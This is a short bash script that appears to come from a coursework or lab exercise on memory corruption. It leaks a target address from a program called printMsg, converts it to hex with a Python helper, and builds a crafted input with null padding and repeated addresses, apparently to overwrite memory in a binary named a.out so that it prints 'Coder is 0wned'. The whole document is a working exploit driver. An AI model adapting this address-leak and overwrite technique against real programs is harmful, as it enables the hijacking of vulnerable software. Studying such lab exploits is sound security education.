#!/bin/bash

#Gets the correct address to write into
echo -ne "\n\n\n" | ./printMsg > msg.txt 2> /dev/null
ADDRESS=`cat msg.txt`

#Converts to proper hex and uses to format attack string
HEX=`python newConvert.py $ADDRESS`
echo -ne "Coder is 0wned\n\nhellohellohello\0hellohellohello\0$HEX\0\0\0\0\0$HEX\0\0\0\0\0" > part4input.txt 

#Runs executable with proper string
./a.out < part4input.txt

